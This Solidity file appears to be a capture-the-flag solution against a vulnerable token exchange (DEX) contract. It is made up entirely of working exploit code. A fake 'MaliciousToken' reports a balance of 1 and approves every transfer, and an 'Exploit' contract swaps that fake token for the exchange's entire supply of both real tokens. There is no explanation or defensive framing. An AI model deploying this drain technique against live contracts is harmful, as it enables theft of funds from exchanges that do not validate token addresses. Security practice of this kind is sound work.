pragma solidity ^0.8.0;

import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'lib/openzeppelin-contracts/contracts/access/Ownable.sol';

interface IDex {
  function token1() external view returns (address);
  function token2() external view returns (address);
  function swap(address from, address to, uint amount) external;
  function approve(address spender, uint amount) external;
}

contract MaliciousToken {
  function balanceOf(address owner) public view returns (uint256) {
    return 1;
  }

  function transferFrom(address from, address to, uint amount) public returns (bool) {
    return true;
  }
}

contract Exploit {

  IDex public dex;
  IERC20 public token1;
  IERC20 public token2;
  MaliciousToken mtoken;

  constructor(address dexAddr) {
    dex = IDex(dexAddr);
    token1 = IERC20(dex.token1());
    token2 = IERC20(dex.token2());
    mtoken = new MaliciousToken();
  }

  function fire() external {
      require(token1.balanceOf(address(this)) == 10, "I need some tokens!!!");
      require(token2.balanceOf(address(this)) == 10, "I need some tokens!!!");
      dex.swap(address(mtoken), address(token1), 1);
      dex.swap(address(mtoken), address(token2), 1);
    }
}